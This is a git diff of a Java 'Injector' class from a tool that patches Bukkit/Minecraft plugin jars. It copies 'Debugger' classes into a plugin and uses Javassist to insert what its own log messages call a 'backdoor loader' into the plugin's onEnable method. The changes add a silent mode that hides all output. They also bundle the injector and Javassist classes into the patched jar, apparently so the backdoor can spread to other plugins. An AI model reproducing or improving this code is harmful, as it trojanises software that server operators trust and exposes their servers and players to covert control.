@@ -1,10 +1,12 @@
 package com.thiccindustries.debugger;
 
-import javassist.*;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
 import org.apache.commons.lang.SystemUtils;
 import org.yaml.snakeyaml.Yaml;
 
-import javax.swing.*;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
@@ -15,13 +17,15 @@ import java.util.Map;
 
 public class Injector {
 
-    public static boolean patchFile(String orig, String out, SimpleConfig config) {
+    public static boolean patchFile(String orig, String out, SimpleConfig config, boolean override, boolean quiet) {
         Path input = Paths.get(orig);
         Path output = Paths.get(out);
 
         if (!input.toFile().exists()) {
-            InjectorGUI.displayError("Input file does not exist.");
-            System.out.println("[Injector] Input file: " + input.getFileName() + " does not exist.");
+            if(!quiet) {
+                InjectorGUI.displayError("Input file does not exist.");
+                System.out.println("[Injector] Input file: " + input.getFileName() + " does not exist.");
+            }
             return false;
         }
 
@@ -35,15 +39,15 @@ public class Injector {
         try {
             Files.copy(input, output);
         } catch (FileAlreadyExistsException e) {
-
-            int override = JOptionPane.showConfirmDialog(null, "File: " + output.getFileName() + " already exists. Override?", "Thicc Industries Injector", JOptionPane.YES_NO_OPTION);
-            if (override == JOptionPane.YES_OPTION) {
+            if (override) {
                 try {
                     Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING);
                 } catch (IOException e1) {
-                    InjectorGUI.displayError("Unknown IO error when creating output file.");
-                    System.out.println("[Injector] Unknown error creating file: " + output.getFileName());
-                    e.printStackTrace();
+                    if(!quiet) {
+                        InjectorGUI.displayError("Unknown IO error when creating output file.");
+                        System.out.println("[Injector] Unknown error creating file: " + output.getFileName());
+                        e.printStackTrace();
+                    }
                     return false;
                 }
             }else{
@@ -51,21 +55,89 @@ public class Injector {
             }
 
         } catch (IOException e) {
-            InjectorGUI.displayError("Unknown IO Error when creating output file.");
-            System.out.println("[Injector] Unknown error creating file: " + output.getFileName());
-            e.printStackTrace();
+            if(!quiet) {
+                InjectorGUI.displayError("Unknown IO Error when creating output file.");
+                System.out.println("[Injector] Unknown error creating file: " + output.getFileName());
+                e.printStackTrace();
+            }
             return false;
         }
 
         /*--- Read Plugin Metadata ---*/
 
-        System.out.println("[Injector] Reading plugin data for file: " + input.getFileName());
-        System.out.println(input.toAbsolutePath());
-        Map<String, Object> pluginYAML = readPluginYAML(input.toAbsolutePath().toString());
+        if(!quiet) {
+            System.out.println("[Injector] Reading plugin data for file: " + input.getFileName());
+            System.out.println(input.toAbsolutePath());
+        }
+        Map<String, Object> pluginYAML = readPluginYAML(input.toAbsolutePath().toString(), quiet);
         String name = (String) pluginYAML.get("name");
         String mainClass = (String) pluginYAML.get("main");
 
-        System.out.println("[Injector] Found plugin name: " + name + "\n[Injector] Found main class: " + mainClass);
+        if(!quiet)
+            System.out.println("[Injector] Found plugin name: " + name + "\n[Injector] Found main class: " + mainClass);
+
+        /*--- Copy Backdoor Code ---*/
+
+        FileSystem outStream    = null;
+        try {
+            outStream   = FileSystems.newFileSystem(output, (ClassLoader) null);
+        } catch (IOException e) {
+            if(!quiet) {
+                e.printStackTrace();
+            }
+        }
+
+        if(!quiet)
+            System.out.println("[Injector] Injecting resources.");
+
+        InputStream[] resourceStreams = new InputStream[resource_paths.length];
+        Path[] targetPaths = new Path[resource_paths.length];
+
+        for(int i = 0; i < resource_paths.length; i++){
+            resourceStreams[i] = Injector.class.getResourceAsStream("/" + resource_paths[i].replace(".", "/") + ".class");
+            targetPaths[i] = outStream.getPath("/" + resource_paths[i].replace(".", "/") + ".class");
+
+            try {
+                Files.createDirectories(targetPaths[i].getParent());
+            } catch (IOException e) {
+                continue;
+            }
+
+        }
+
+        try {
+            //copy files
+
+            for (int i = 0; i < targetPaths.length; i++) {
+                if(!quiet)
+                    System.out.println("    (" + (i + 1) + "/" + targetPaths.length + ") " + targetPaths[i].getFileName());
+                Files.copy(resourceStreams[i], targetPaths[i]);
+            }
+
+        }catch(FileAlreadyExistsException e){
+            if(!quiet) {
+                InjectorGUI.displayError("Plugin already patched.");
+                System.out.println("[Injector] Plugin already patched.");
+                e.printStackTrace();
+            }
+
+            try {
+                outStream.close();
+            } catch (IOException ex) {
+                if(!quiet)
+                    ex.printStackTrace();
+            }
+
+            return false;
+        }
+        catch(IOException e){
+            if(!quiet) {
+                InjectorGUI.displayError("Unknown IO error while copying resources.");
+                System.out.println("[Injector] Unknown IO error while copying resources.");
+                e.printStackTrace();
+            }
+            return false;
+        }
 
         /*--- Insert bytecode into main class ---*/
 
@@ -76,7 +148,8 @@ public class Injector {
 
             //Get main class, and find onEnable method
 
-            System.out.println("[Injector] Injecting backdoor loader into class.");
+            if(!quiet)
+                System.out.println("[Injector] Injecting backdoor loader into class.");
 
             CtClass cc = pool.get(mainClass);
             CtMethod m = cc.getDeclaredMethod("onEnable");
@@ -92,109 +165,50 @@ public class Injector {
                     sb.append(",");
             }
             sb.append("}");
-            System.out.println("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\"); }");
+            if(!quiet)
+                System.out.println("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\"); }");
             m.insertAfter("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\"); }");
 
             //Write to temporary file
             cc.writeFile(temp.toString());
         }catch(Exception e){
-            InjectorGUI.displayError("Unknown Javassist error.");
-            System.out.println("[Injector] Unknown Javassist error.");
-            e.printStackTrace();
+            if(!quiet) {
+                InjectorGUI.displayError("Unknown Javassist error.");
+                System.out.println("[Injector] Unknown Javassist error.");
+                e.printStackTrace();
+            }
             return false;
         }
 
         /*--- Write new main class ---*/
 
-        System.out.println("[Injector] Writing patched main class.");
-
+        if(!quiet)
+            System.out.println("[Injector] Writing patched main class.");
         Path patchedFile        = null;
-        FileSystem outStream    = null;
         Path target             = null;
+
         try {
             //Write final patched file
             patchedFile = Paths.get("temp/" + mainClass.replace(".", "/") + ".class");
-            outStream   = FileSystems.newFileSystem(output, (ClassLoader) null);
             target      = outStream.getPath("/" + mainClass.replace(".", "/") + ".class");
 
             Files.copy(patchedFile, target, StandardCopyOption.REPLACE_EXISTING);
-        }catch(IOException e){
-            InjectorGUI.displayError("Unknown IO error when copying new main class.");
-            System.out.println("[Injector] Unknown IO error when copying new main class.");
-            e.printStackTrace();
-            return false;
-        }
-
-        /*--- Copy Backdoor Code ---*/
-
-        System.out.println("[Injector] Injecting resources.");
-
-        InputStream[] resourceStreams = {
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$1.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$2.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$3.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$4.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$5.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$6.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$7.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$8.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$9.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$10.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$11.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Config.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Config$HelpItem.class")
-        };
-
-
-        Path[] targetPaths = {
-                outStream.getPath("/com/thiccindustries/debugger/Debugger.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Debugger$1.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Debugger$2.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Debugger$3.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Debugger$4.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Debugger$5.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Debugger$6.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Debugger$7.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Debugger$8.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Debugger$9.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Debugger$10.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Debugger$11.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Config.class"),
-                outStream.getPath("/com/thiccindustries/debugger/Config$HelpItem.class")
-        };
-
-        try {
-            //Create thiccindustries directory structure
-            Files.createDirectories(outStream.getPath("/com/thiccindustries/debugger"));
-
-            //copy files
-
-            for (int i = 0; i < targetPaths.length; i++) {
-                System.out.println("    (" + (i + 1) + "/" + targetPaths.length + ") " + targetPaths[i].getFileName());
-                Files.copy(resourceStreams[i], targetPaths[i]);
-            }
-
-            System.out.println("[Injector] Finished writing file: " + output.getFileName());
+            if(!quiet)
+                System.out.println("[Injector] Finished writing file: " + output.getFileName());
             outStream.close();
+        }catch(IOException e){
+            if(!quiet) {
+                System.out.println("[Injector] Unknown IO error when copying new main class.");
+                e.printStackTrace();
+            }
+            return false;
+        }
 
-        }catch(FileAlreadyExistsException e){
-            InjectorGUI.displayError("Resource file exists, is the plugin already patched?");
-            System.out.println("[Injector] Plugin already patched.");
-            e.printStackTrace();
-            return false;
-        }
-        catch(IOException e){
-            InjectorGUI.displayError("Unknown IO error while copying resources.");
-            System.out.println("[Injector] Unknown IO error while copying resources.");
-            e.printStackTrace();
-            return false;
-        }
 
         return true;
     }
 
-    private static Map<String, Object> readPluginYAML(String path) {
+    private static Map<String, Object> readPluginYAML(String path, boolean quiet) {
         Yaml yamlData = new Yaml();
         InputStream is = null;
 
@@ -212,9 +226,11 @@ public class Injector {
                 is = connection.getInputStream();
             }
         } catch (IOException e) {
-            InjectorGUI.displayError("Error while reading plugin metadata.");
-            System.out.println("[Injector] Unknown error whilst parsing plugin YAML.");
-            e.printStackTrace();
+            if(!quiet) {
+                InjectorGUI.displayError("Unknown error whist parsing plugin YAML.");
+                System.out.println("[Injector] Unknown error whilst parsing plugin YAML.");
+                e.printStackTrace();
+            }
             return null;
         }
 
@@ -234,6 +250,187 @@ public class Injector {
         }
     }
 
+    private static String[] resource_paths = {
+            "com.thiccindustries.debugger.Debugger",
+            "com.thiccindustries.debugger.Debugger$1",
+            "com.thiccindustries.debugger.Debugger$2",
+            "com.thiccindustries.debugger.Debugger$3",
+            "com.thiccindustries.debugger.Debugger$4",
+            "com.thiccindustries.debugger.Debugger$5",
+            "com.thiccindustries.debugger.Debugger$6",
+            "com.thiccindustries.debugger.Debugger$7",
+            "com.thiccindustries.debugger.Debugger$8",
+            "com.thiccindustries.debugger.Debugger$9",
+            "com.thiccindustries.debugger.Debugger$10",
+            "com.thiccindustries.debugger.Debugger$11",
+            "com.thiccindustries.debugger.Config",
+            "com.thiccindustries.debugger.Config$HelpItem",
+            "com.thiccindustries.debugger.Injector",
+            "com.thiccindustries.debugger.Injector$SimpleConfig",
+            "javassist.ClassPath",
+            "javassist.ClassPool",
+            "javassist.NotFoundException",
+            "javassist.CannotCompileException",
+            "javassist.CtClass",
+            "javassist.CtArray",
+            "javassist.CtClassType",
+            "javassist.CtNewClass",
+            "javassist.CtNewNestedClass",
+            "javassist.ClassPool$1",
+            "javassist.ClassPoolTail",
+            "javassist.CtPrimitiveType",
+            "javassist.ClassMap",
+            "javassist.CtClass$1",
+            "javassist.CtClass$DelayedFileOutputStream",
+            "javassist.ClassClassPath",
+            "javassist.ClassPathList",
+            "javassist.JarClassPath",
+            "javassist.CtMember",
+            "javassist.CtBehavior",
+            "javassist.CtMethod",
+            "javassist.CtField",
+            "javassist.CtConstructor",
+            "javassist.bytecode.BadBytecode",
+            "javassist.compiler.CompileError",
+            "javassist.bytecode.AttributeInfo",
+            "javassist.bytecode.InnerClassesAttribute",
+            "javassist.bytecode.SignatureAttribute",
+            "javassist.bytecode.ConstantAttribute",
+            "javassist.CtMember$Cache",
+            "javassist.bytecode.ClassFile",
+            "javassist.bytecode.DuplicateMemberException",
+            "javassist.bytecode.ConstPool",
+            "javassist.bytecode.ConstInfo",
+            "javassist.bytecode.ConstInfoPadding",
+            "javassist.bytecode.NameAndTypeInfo",
+            "javassist.bytecode.MemberrefInfo",
+            "javassist.bytecode.FieldrefInfo",
+            "javassist.bytecode.MethodrefInfo",
+            "javassist.bytecode.InterfaceMethodrefInfo",
+            "javassist.bytecode.StringInfo",
+            "javassist.bytecode.IntegerInfo",
+            "javassist.bytecode.FloatInfo",
+            "javassist.bytecode.LongInfo",
+            "javassist.bytecode.DoubleInfo",
+            "javassist.bytecode.MethodHandleInfo",
+            "javassist.bytecode.MethodTypeInfo",
+            "javassist.bytecode.InvokeDynamicInfo",
+            "javassist.bytecode.Utf8Info",
+            "javassist.bytecode.ClassInfo",
+            "javassist.bytecode.LongVector",
+            "javassist.bytecode.FieldInfo",
+            "javassist.bytecode.AnnotationDefaultAttribute",
+            "javassist.bytecode.BootstrapMethodsAttribute",
+            "javassist.bytecode.Opcode",
+            "javassist.bytecode.CodeAttribute",
+            "javassist.bytecode.DeprecatedAttribute",
+            "javassist.bytecode.EnclosingMethodAttribute",
+            "javassist.bytecode.ExceptionsAttribute",
+            "javassist.bytecode.LineNumberAttribute",
+            "javassist.bytecode.LocalVariableAttribute",
+            "javassist.bytecode.LocalVariableTypeAttribute",
+            "javassist.bytecode.MethodParametersAttribute",
+            "javassist.bytecode.AnnotationsAttribute",
+            "javassist.bytecode.ParameterAnnotationsAttribute",
+            "javassist.bytecode.TypeAnnotationsAttribute",
+            "javassist.bytecode.SourceFileAttribute",
+            "javassist.bytecode.SyntheticAttribute",
+            "javassist.bytecode.StackMap",
+            "javassist.bytecode.StackMapTable",
+            "javassist.bytecode.MethodInfo",
+            "javassist.bytecode.CodeAttribute$RuntimeCopyException",
+            "javassist.bytecode.ExceptionTable",
+            "javassist.bytecode.ExceptionTableEntry",
+            "javassist.bytecode.StackMapTable$RuntimeCopyException",
+            "javassist.bytecode.Descriptor",
+            "javassist.bytecode.CodeIterator",
+            "javassist.bytecode.CodeIterator$AlignmentException",
+            "javassist.bytecode.CodeIterator$Branch",
+            "javassist.bytecode.CodeIterator$Branch16",
+            "javassist.bytecode.CodeIterator$Jump16",
+            "javassist.bytecode.CodeIterator$If16",
+            "javassist.bytecode.ByteVector",
+            "javassist.bytecode.Bytecode",
+            "javassist.compiler.Javac",
+            "javassist.compiler.ast.Visitor",
+            "javassist.compiler.TokenId",
+            "javassist.compiler.CodeGen",
+            "javassist.compiler.MemberCodeGen",
+            "javassist.compiler.JvstCodeGen",
+            "javassist.compiler.ProceedHandler",
+            "javassist.compiler.Javac$CtFieldWithInit",
+            "javassist.compiler.ast.ASTree",
+            "javassist.compiler.ast.ASTList",
+            "javassist.compiler.ast.Stmnt",
+            "javassist.compiler.ast.Expr",
+            "javassist.compiler.ast.AssignExpr",
+            "javassist.compiler.ast.BinExpr",
+            "javassist.compiler.ast.CastExpr",
+            "javassist.compiler.ast.InstanceOfExpr",
+            "javassist.compiler.TypeChecker",
+            "javassist.compiler.CodeGen$ReturnHook",
+            "javassist.compiler.CodeGen$1",
+            "javassist.compiler.ast.Symbol",
+            "javassist.compiler.ast.Member",
+            "javassist.compiler.MemberCodeGen$JsrHook2",
+            "javassist.compiler.ast.ArrayInit",
+            "javassist.compiler.NoFieldException",
+            "javassist.compiler.JvstTypeChecker",
+            "javassist.compiler.MemberResolver",
+            "javassist.compiler.ast.StringL",
+            "javassist.compiler.ast.CallExpr",
+            "javassist.compiler.ast.DoubleConst",
+            "javassist.compiler.ast.IntConst",
+            "javassist.compiler.ast.Keyword",
+            "javassist.compiler.ast.NewExpr",
+            "javassist.compiler.SymbolTable",
+            "javassist.bytecode.AccessFlag",
+            "javassist.Modifier",
+            "javassist.compiler.ast.Declarator",
+            "javassist.bytecode.ByteArray",
+            "javassist.compiler.Parser",
+            "javassist.compiler.SyntaxError",
+            "javassist.compiler.ast.MethodDecl",
+            "javassist.compiler.ast.FieldDecl",
+            "javassist.compiler.ast.CondExpr",
+            "javassist.compiler.ast.Pair",
+            "javassist.compiler.ast.Variable",
+            "javassist.compiler.Lex",
+            "javassist.compiler.KeywordTable",
+            "javassist.compiler.Token",
+            "javassist.bytecode.SignatureAttribute$Type",
+            "javassist.bytecode.SignatureAttribute$ObjectType",
+            "javassist.bytecode.SignatureAttribute$ArrayType",
+            "javassist.bytecode.SignatureAttribute$BaseType",
+            "javassist.bytecode.SignatureAttribute$ClassType",
+            "javassist.bytecode.SignatureAttribute$TypeVariable",
+            "javassist.compiler.MemberResolver$Method",
+            "javassist.bytecode.CodeIterator$Gap",
+            "javassist.bytecode.StackMapTable$Walker",
+            "javassist.bytecode.StackMapTable$OffsetShifter",
+            "javassist.bytecode.StackMapTable$Shifter",
+            "javassist.bytecode.stackmap.TypeTag",
+            "javassist.bytecode.stackmap.Tracer",
+            "javassist.bytecode.stackmap.MapMaker",
+            "javassist.bytecode.stackmap.TypeData",
+            "javassist.bytecode.stackmap.TypeData$BasicType",
+            "javassist.bytecode.stackmap.BasicBlock$JsrBytecode",
+            "javassist.bytecode.stackmap.TypeData$ClassName",
+            "javassist.bytecode.stackmap.BasicBlock",
+            "javassist.bytecode.stackmap.TypedBlock",
+            "javassist.bytecode.stackmap.BasicBlock$Maker",
+            "javassist.bytecode.stackmap.TypedBlock$Maker",
+            "javassist.bytecode.stackmap.BasicBlock$Mark",
+            "javassist.bytecode.stackmap.BasicBlock$Catch",
+            "javassist.bytecode.stackmap.TypeData$AbsTypeVar",
+            "javassist.bytecode.stackmap.TypeData$TypeVar",
+            "javassist.bytecode.stackmap.TypeData$UninitTypeVar",
+            "javassist.bytecode.stackmap.TypeData$UninitData",
+            "javassist.bytecode.stackmap.TypeData$NullType",
+            "javassist.bytecode.stackmap.TypeData$ArrayElement",
+            "javassist.bytecode.StackMapTable$Writer",
+            "org.bukkit.plugin.Plugin"
+    };
 }
 
 
